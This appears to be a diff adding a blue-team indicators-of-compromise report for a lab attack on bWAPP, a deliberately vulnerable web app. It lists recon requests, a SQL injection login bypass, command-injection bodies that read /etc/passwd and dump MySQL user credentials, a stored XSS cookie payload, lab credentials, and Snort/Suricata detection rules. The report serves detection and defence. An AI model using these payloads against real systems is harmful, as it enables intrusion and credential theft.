@@ -1,0 +1,93 @@
+NETWORK IOCs — BLUE-2026-03-13-001
+Target: 10.10.30.128 (bWAPP)
+Generated: 2026-03-13T12:07:00Z
+
+=== NETWORK-LAYER INDICATORS OF COMPROMISE ===
+
+TARGET HOST
+  IP:      10.10.30.128
+  OS:      Ubuntu 14.04.3 LTS (Docker container 770425fcb17d)
+  Services: TCP/80 (Apache 2.4.7), TCP/3306 (MySQL 5.5.47)
+
+EXPOSED SERVICES (NETWORK RISK)
+  [NET-001] TCP/3306 MYSQL EXPOSED TO NETWORK
+    Binding: 0.0.0.0:3306 (all interfaces)
+    Credentials: thor/Asgard (from wp-config.bak), root/(empty) from RCE
+    Risk: Any host on the network can attempt MySQL authentication
+    Recommendation: Bind MySQL to 127.0.0.1 only; block 3306 at firewall
+
+  [NET-002] TCP/80 HTTP (NO TLS)
+    No HTTPS — all traffic transmitted in plaintext
+    Credentials submitted over login.php in cleartext POST bodies
+    Session cookies transmitted unencrypted
+
+=== HTTP REQUEST SIGNATURES (ATTACK TRAFFIC) ===
+
+Phase: Reconnaissance (10:00–10:15Z)
+  GET /robots.txt HTTP/1.1
+  GET /passwords/ HTTP/1.1                    → Directory listing
+  GET /passwords/wp-config.bak HTTP/1.1       → Credential file download
+  GET /passwords/heroes.xml HTTP/1.1          → Plaintext credential download
+  GET /db/ HTTP/1.1                           → Directory listing
+  GET /db/bwapp.sqlite HTTP/1.1               → SQLite DB download (~12K)
+  GET /admin/ HTTP/1.1                        → Admin portal access (200 OK, no auth)
+  GET /phpinfo.php HTTP/1.1                   → PHP config disclosure
+  GET /info.php HTTP/1.1                      → App info page
+  GET /soap/ HTTP/1.1                         → SOAP library source exposure
+  GET /documents/ HTTP/1.1                    → Document directory listing
+
+Phase: Exploitation (11:00–11:15Z)
+  POST /login.php HTTP/1.1
+    Body: login=A.I.M.&password=bug&security_level=1&form=submit
+    Response: 302 Found → Location: portal.php
+
+  POST /sqli_16.php HTTP/1.1
+    Body: login=bee' AND '1'='1' OR '1'='1&password=anything&form=submit
+    Response: 200 OK — "Welcome A.I.M., how are you today?"
+    SIGNATURE: SQL boolean tautology in login parameter
+
+  POST /commandi.php HTTP/1.1
+    Body: target=www.nsa.gov; id&form=submit
+    Response: 200 OK — "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    SIGNATURE: Semicolon shell separator in DNS target parameter
+
+  POST /xss_stored_1.php HTTP/1.1
+    Body: entry=<script>alert(document.cookie)</script>&entry_add=add
+    Response: 200 OK — script stored in database
+    SIGNATURE: HTML script tag in blog entry POST body
+
+Phase: Post-Exploitation (11:15–11:30Z)
+  POST /commandi.php (repeated) — system enumeration commands via RCE:
+    target=www.nsa.gov; cat /etc/passwd
+    target=www.nsa.gov; cat /app/admin/settings.php
+    target=www.nsa.gov; mysql -u root --password='' -e 'SELECT login,password,email,admin FROM bWAPP.users;'
+    target=www.nsa.gov; hostname
+    target=www.nsa.gov; uname -a
+
+=== SNORT/SURICATA DETECTION RULES (RECOMMENDED) ===
+
+# SQL Injection — Boolean tautology in POST body login parameter
+alert http any any -> 10.10.30.128 80 (msg:"SQL INJECTION — Tautological login bypass"; flow:to_server,established; http.method; content:"POST"; http.uri; content:"/sqli"; http.request_body; content:"'"; content:"OR"; distance:0; content:"'='"; distance:0; sid:9000001; rev:1;)
+
+# OS Command Injection — Semicolon in commandi.php target parameter
+alert http any any -> 10.10.30.128 80 (msg:"OS COMMAND INJECTION — Shell separator in commandi.php"; flow:to_server,established; http.method; content:"POST"; http.uri; content:"/commandi.php"; http.request_body; content:"target="; content:";"; distance:0; sid:9000002; rev:1;)
+
+# Stored XSS — Script tag in blog form
+alert http any any -> 10.10.30.128 80 (msg:"STORED XSS — Script tag injection in blog"; flow:to_server,established; http.method; content:"POST"; http.uri; content:"/xss_stored"; http.request_body; content:"<script>"; nocase; sid:9000003; rev:1;)
+
+# Sensitive backup file download
+alert http any any -> 10.10.30.128 80 (msg:"SENSITIVE FILE ACCESS — Backup file download"; flow:to_server,established; http.method; content:"GET"; http.uri; content:".bak"; sid:9000004; rev:1;)
+
+# SQLite DB download
+alert http any any -> 10.10.30.128 80 (msg:"SENSITIVE FILE ACCESS — SQLite database download"; flow:to_server,established; http.method; content:"GET"; http.uri; content:".sqlite"; sid:9000005; rev:1;)
+
+# MySQL exposed port connection attempt
+alert tcp any any -> 10.10.30.128 3306 (msg:"MYSQL EXPOSED — External connection attempt to port 3306"; flow:to_server,new; sid:9000006; rev:1;)
+
+=== NETWORK TOPOLOGY ===
+
+  Attacker → (LAN) → 10.10.30.128:80  [Apache/bWAPP]
+                   → 10.10.30.128:3306 [MySQL — exposed]
+  Container: 770425fcb17d (Docker)
+  Internal DNS: 127.0.0.11:46549
+  No outbound egress filtering observed during engagement
